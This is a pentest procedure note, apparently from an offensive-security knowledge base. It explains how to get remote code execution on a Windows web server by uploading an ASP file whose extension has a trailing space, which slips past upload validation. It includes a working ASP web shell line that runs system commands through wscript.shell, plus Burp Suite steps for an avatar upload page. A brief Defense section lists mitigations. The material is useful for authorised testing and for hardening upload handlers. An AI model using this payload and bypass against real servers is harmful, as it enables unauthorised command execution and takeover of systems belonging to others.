---
tags:
  - rce
  - file-upload
  - bypass
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/asp-rce-code]]'
  - '[[commands/cmd-whoami]]'
platforms:
  - Web
  - Windows
techniques:
  - '[[Server Software Component]]'
  - '[[Command-Line Interface]]'
skill_level: advanced
impact_level: critical
detection_risk: high
sub_techniques: []
id: 4e37daf6-b3af-4e47-800d-672ea2ece288
created_at: '2025-12-13T09:00:33.862Z'
updated_at: '2025-12-13T09:00:33.862Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Server Software Component]]'
  - '[[Command-Line Interface]]'
---
# Achieve RCE via Arbitrary ASP File Upload

## Summary

This procedure bypasses file upload restrictions to upload ASP files with malicious code, achieving remote code execution on the Windows server.

## Description

By adding a space after the file extension (e.g., '.asp '), attackers bypass validation, allowing dynamic ASP files to be uploaded and executed. Embedded code runs system commands like 'whoami'.

## Requirements

1. Burp Suite for request interception
2. Malicious ASP file content
3. Access to avatar upload page

## Defense

Defensive measures and detection strategies:

- Strict filename and extension validation, including trimming spaces
- Restrict execution of uploaded files in temp directories
- Monitor for command execution logs on the server

## Objectives

1. Upload ASP file with RCE payload
2. Execute arbitrary commands
3. Gain server control

## Instructions

### Step 1: Prepare and Upload ASP File

**Context**: Modify filename to bypass restrictions and include RCE code.

Use [[tools/Burp-Suite]] to upload file with name like 'i_can_upload_aspfile_by_space.asp ' and embed [[commands/asp-rce-code]]:

```asp
<%response.write server.createobject("wscript.shell").exec("cmd.exe /c whoami").stdout.readall%>
```

> This uploads the file despite restrictions.

### Step 2: Trigger Execution

**Context**: Access the uploaded ASP to run the code.

Visit the uploaded file URL to execute the embedded command [[commands/cmd-whoami]].

> Command output is displayed, confirming RCE.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Server Software Component]]
- [[Command-Line Interface]]

### Sub-Techniques



## Commands Used

- [[commands/asp-rce-code]]
- [[commands/cmd-whoami]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- rce
- file-upload
- bypass
